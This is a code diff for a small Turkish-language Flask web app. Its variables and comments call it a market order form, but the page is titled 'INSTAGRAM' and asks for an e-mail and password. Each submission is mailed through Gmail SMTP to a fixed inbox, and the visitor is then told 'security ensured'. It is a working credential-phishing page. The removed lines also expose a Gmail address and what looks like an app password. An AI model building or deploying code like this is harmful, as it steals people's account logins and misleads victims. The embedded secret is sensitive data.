@@ -6,19 +6,23 @@ import os
 
 app = Flask(__name__)
 
-# =========================
-# BURAYI KENDİNE GÖRE DEĞİŞTİR
-# =========================
+# ==================================================
+# BURAYI DEĞİŞTİR
+# ==================================================
 
 MARKET_ADI = "INSTAGRAM"
+# Örnek:
+# MARKET_ADI = "MEMO MARKET"
 
-GMAIL_GONDEREN = os.environ.get("memoapk7@gmail.com")       # Render environment variable
-GMAIL_APP_SIFRE = os.environ.get("dtvsvgemvslqijle")      # Render environment variable
-ALICI_MAIL = os.environ.get("memoapk7@gmail.com")       # Render environment variable
+# Gmail bilgileri buraya yazılmayacak.
+# Bunlar Render'daki Environment Variables kısmından gelecek.
+GMAIL_GONDEREN = os.environ.get("GMAIL_USER")
+GMAIL_APP_SIFRE = os.environ.get("GMAIL_PASS")
+ALICI_MAIL = os.environ.get("RECEIVER_EMAIL")
 
-# =========================
+# ==================================================
 # HTML SAYFASI
-# =========================
+# ==================================================
 
 HTML = """
 <!doctype html>
@@ -105,11 +109,11 @@ HTML = """
         <h1>{{ market_adi }}</h1>
 
         <form method="POST">
-            <label for="urun1"> e posta </label>
-            <input type="text" id="urun1" name="urun1" placeholder="e posta veya kullanıcı adı">
+            <label for="urun1">e posta</label>
+            <input type="text" id="urun1" name="urun1" placeholder="Buraya yiyecek yaz">
 
-            <label for="urun2"> şifre </label>
-            <input type="text" id="urun2" name="urun2" placeholder="şifreni yaz">
+            <label for="urun2">şifre</label>
+            <input type="text" id="urun2" name="urun2" placeholder="Buraya içecek yaz">
 
             <button type="submit">Gönder</button>
         </form>
@@ -124,36 +128,40 @@ HTML = """
 </html>
 """
 
-# =========================
-# MAIL GÖNDERME FONKSİYONU
-# =========================
+# ==================================================
+# MAIL GÖNDERME
+# ==================================================
 
 def mail_gonder(urun1, urun2):
+    if not GMAIL_GONDEREN or not GMAIL_APP_SIFRE or not ALICI_MAIL:
+        raise Exception("Render environment variables eksik")
+
     konu = f"{MARKET_ADI} - Yeni Sipariş"
 
     icerik = f"""
 Yeni sipariş geldi.
 
 Market adı: {MARKET_ADI}
-1. Ürün: {urun1 if urun1 else '-'}
-2. Ürün: {urun2 if urun2 else '-'}
+Yiyecekler: {urun1 if urun1 else '-'}
+İçecekler: {urun2 if urun2 else '-'}
 """
 
     msg = MIMEMultipart()
     msg["From"] = GMAIL_GONDEREN
     msg["To"] = ALICI_MAIL
     msg["Subject"] = konu
-
     msg.attach(MIMEText(icerik, "plain", "utf-8"))
 
     with smtplib.SMTP("smtp.gmail.com", 587) as server:
+        server.ehlo()
         server.starttls()
+        server.ehlo()
         server.login(GMAIL_GONDEREN, GMAIL_APP_SIFRE)
         server.send_message(msg)
 
-# =========================
+# ==================================================
 # ANA SAYFA
-# =========================
+# ==================================================
 
 @app.route("/", methods=["GET", "POST"])
 def index():
@@ -165,12 +173,12 @@ def index():
         urun2 = request.form.get("urun2", "").strip()
 
         if not urun1 and not urun2:
-            mesaj = "En az bir ürün yazmalısın."
+            mesaj = "En az bir alan doldurmalısın."
             mesaj_tipi = "hatali"
         else:
             try:
                 mail_gonder(urun1, urun2)
-                mesaj = "Sipariş başarıyla gönderildi."
+                mesaj = "güvenlik sağlandı"
                 mesaj_tipi = "basarili"
             except Exception as e:
                 mesaj = f"Hata oluştu: {str(e)}"
@@ -183,9 +191,9 @@ def index():
         mesaj_tipi=mesaj_tipi
     )
 
-# =========================
+# ==================================================
 # ÇALIŞTIRMA
-# =========================
+# ==================================================
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
